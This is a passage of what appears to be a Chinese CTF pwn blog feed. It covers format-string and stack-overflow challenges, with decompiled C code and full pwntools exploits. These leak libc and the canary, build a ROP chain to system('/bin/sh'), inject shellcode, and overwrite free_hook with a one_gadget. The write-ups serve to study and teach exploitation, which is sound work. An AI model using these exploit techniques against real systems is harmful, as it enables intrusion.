class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__fastcall <span class="title">sub_15B6</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 (__fastcall **a2)(<span class="type">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+10h] [rbp-9A0h]</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+18h] [rbp-998h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">632</span>]; <span class="comment">// [rsp+730h] [rbp-280h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+9A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  n = <span class="built_in">strlen</span>(a1) + <span class="number">1</span>;</span><br><span class="line">  v4 = (<span class="type">void</span> *)(*a2)(n);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(v4, a1, n);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中如果n&lt;0xFFF同时dest只有632的大小，那么就有个栈溢出</p><p>取自ixout学长的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Init Data size: \n&#x27;</span>,tbs(<span class="number">120</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your Json:\n&#x27;</span>,<span class="string">b&#x27;&#123;&quot;a&quot;:&quot;b&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;%p%25$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=<span class="built_in">int</span>(ru(<span class="string">&#x27;23&#x27;</span>)[-<span class="number">12</span>:],<span class="number">16</span>)-<span class="number">0x1ED723</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">canary=<span class="built_in">int</span>(ru(<span class="string">&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">16</span>:],<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.address+<span class="number">0x23b6a</span></span><br><span class="line">ret=libc.address+<span class="number">0x23b6b</span></span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#dbg(&#x27;b *$rebase(0x15B6)&#x27;)</span></span><br><span class="line">edit(<span class="string">b&#x27;ixout&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">632</span>+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(binsh)+p64(ret)+p64(system))</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://ixout.github.io/posts/22716/">https://ixout.github.io/posts/22716/</a></p><p><a href="https://www.ctfiot.com/189832.html">https://www.ctfiot.com/189832.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;比赛的时候全靠fix得分，也是参与上了&lt;/p&gt;
&lt;h1 id=&quot;baby-jit&quot;&gt;&lt;a href=&quot;#baby-jit&quot; class=&quot;headerlink&quot; title=&quot;baby_jit&quot;&gt;&lt;/a&gt;baby_jit&lt;/h1&gt;&lt;figure class=&quot;highlig</summary>
      
    
    
    
    <category term="赛后复盘" scheme="http://s1nec-1o.github.io/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>谈非栈上格式化字符串</title>
    <link href="http://s1nec-1o.github.io/2024/08/05/%E8%B0%88%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>http://s1nec-1o.github.io/2024/08/05/%E8%B0%88%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2024-08-05T03:02:34.000Z</published>
    <updated>2024-08-20T11:12:45.772Z</updated>
    
    <content type="html"><![CDATA[<ul><li><strong>%hhn（写入一字节）</strong></li><li><strong>%hn（写入两字节）</strong></li><li><strong>%n（32位写四字节）</strong></li><li><strong>%ln &#x2F; %lln（写入八字节）</strong></li></ul><h1 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining_playfmt"></a>hitcontraining_playfmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051105164.png" alt="image-20240729154014016"></p><p>首先是设置输出为无缓冲模式，然后以参数的数量的地址传参</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051105271.png" alt="image-20240729154330774"></p><p>里面调用do_fmt函数，显然是一个非栈上的格式化字符串漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106088.png" alt="image-20240729154408434"></p><p>没有保护，且有RWX段，gdb进去可以看到栈便是RWX段，但是没什么软用，因为是非栈上的格式化字符串</p><p>这题是通过在buf段构造shellcode的，因为是老题了，在很old的内核版本的数据段是可执行的，直到5点多才不可执行的</p><p>因此就看一个思路即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">duan</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">x64_32 = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> x64_32:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./playfmt&#x27;</span>)</span><br><span class="line">buf=<span class="number">0x0804A060</span></span><br><span class="line">pre_ebp=<span class="number">0x080485AD</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span></span><br><span class="line"><span class="comment">#aaaa-0x8048680-0x4-0x8048507-0x8048685-0x804a000-0xffffce98-0x80485ad-0xf7fb5d60-0x804a000-0xffffcea8-0x80485ea-0xffffcec0-(nil)-(nil)-0xf7e1a647-0xf7fb5000-0xf7fb5000-(nil)</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;==\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0x28</span>+<span class="number">0x1c</span></span><br><span class="line">leak(<span class="string">&#x27;stack_addr:&#x27;</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(stack_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&#x27;c%6$hn&#x27;</span> </span><br><span class="line">pl = pl.ljust(<span class="number">200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">s(pl)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment"># duan()</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xa064</span>).encode() + <span class="string">b&#x27;c%10$hn&#x27;</span> </span><br><span class="line">pl = pl.ljust(<span class="number">200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">s(pl)</span><br><span class="line">p.recv()</span><br><span class="line">duan()</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">pl = <span class="string">b&#x27;quit&#x27;</span> + shellcode</span><br><span class="line">s(pl)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h3 id="思考点"><a href="#思考点" class="headerlink" title="思考点"></a>思考点</h3><ul><li>printf的栈布局受内核版本的影响而不受libc版本的影响</li><li>由于本题没有标志性的输出，导致的exp打得不稳定</li><li>非栈上的格式化字符串漏洞需要两次间接覆盖才可以覆盖返回地址</li></ul><h1 id="easy-printf-64位"><a href="#easy-printf-64位" class="headerlink" title="easy_printf (64位)"></a>easy_printf (64位)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s2; <span class="comment">// [rsp+8h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know who the best pwner is?&quot;</span>);</span><br><span class="line">  base64_decode(encoded_string, &amp;s2);           <span class="comment">//VG9rYW1laW5FX2lzX3RoZV9iZXN0X3B3bmVy</span></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x3C</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    vuln();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I think your idea is wrong&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里找一个在线网站解一下base64，然后进入vuln</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Oh,you are right&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this place&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fmtstr();</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">fmtstr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">12</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>有13次的printf</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>利用非栈上的格式化字符串来修改free_hook为one_gadget<br>__libc_start_main+240 ：main函数的返回地址</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106456.png" alt="image-20240805101007065"><br>这个题首先就是运用rbp附近的两个跳板(偏移为8和10)，把_libc_start_main+240改成free_hook<br>这里需要改6位，所以需要4步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(num)+<span class="string">&#x27;c%8$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(free_hook&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%10$hn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(num+<span class="number">2</span>)+<span class="string">&#x27;c%8$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((free_hook//<span class="number">0x10000</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里前两步修改就是直接对 _libc_start_main+240 后两位进行了修改<br>后两步是先修改了一下地址，然后修改了 _libc_start_main+240 的倒数3，4位(就是不能直接修改地址的倒数3，4位，我们就修改地址，然后改新地址的最后两位，以达到修改地址的倒数3，4位的目的)</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106802.png" alt="image-20240805101050623"><br>然后再用跳板把free_hook改为one_gadget<br>free_hook (0x7fde287987a8) 与 one_gadget (0x7fde2841727a) 也是后6位有区别，所以需要多步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(og&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%29$hn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(num)+<span class="string">&#x27;c%8$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xaa</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((og//<span class="number">0x10000</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%29$hn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xac</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(free&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%29$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xad</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(free1)+<span class="string">&#x27;c%29$hhn&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第一步是先直接修改free_hook的后四位，第二三步是把 _libc_start_main+240 修改成了 free_hook+2 (free_hook最后两位是0xa8 , 0xa8+0x2&#x3D;0xaa , 这个地址是用libc查找的，所以本地和远程后三位是一致的)，然后再用这种方法修改。</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106200.png" alt="image-20240805101101694"><br>这里再执行完上面最后一步就可以修改完了，然后执行free函数就直接getshell了。</p><p>由于找不到题目，因此大致看了下思路，也是通过间接覆盖地址</p><h1 id="二进制专项-fooooood-64位"><a href="#二进制专项-fooooood-64位" class="headerlink" title="二进制专项 fooooood (64位)"></a>二进制专项 fooooood (64位)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  Init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have you heard about YANGSHEN?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;YangShen said that he want to know your name.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your name:&quot;</span>);</span><br><span class="line">  getstring(name, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">3</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, you have %d times to tell me what is your favourite food!\nwhat&#x27;s your favourite food: &quot;</span>, i);</span><br><span class="line">    getstring(food, <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You like &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(food);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;!?\nI like it too!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">getstring</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )                    <span class="comment">// a2=32</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (i + a1), <span class="number">1uLL</span>);                    <span class="comment">// a1=name  bss</span></span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) == <span class="number">0xA</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三次格式化字符串漏洞</p><p>只有三次的格式化字符串漏洞，而i的值位于栈上，因此先修改格式化字符串漏洞的次数，再覆盖 <code>_libc_start_main+240</code>为 <code>one_gadget</code>即可</p><h1 id="2024DASCTF-springboard"><a href="#2024DASCTF-springboard" class="headerlink" title="2024DASCTF springboard"></a>2024DASCTF springboard</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="built_in">void</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))myinit)(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Life is not boring, dreams are not out of reach.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Sometimes you just need a springboard.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Then you can see a wider world.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There may be setbacks along the way.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But keep your love of life alive.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I believe that you will succeed.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck.&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here&#x27;s a simple pwn question, challenge yourself.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have an 5 chances to get a flag&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the %d time\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter a keyword&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span 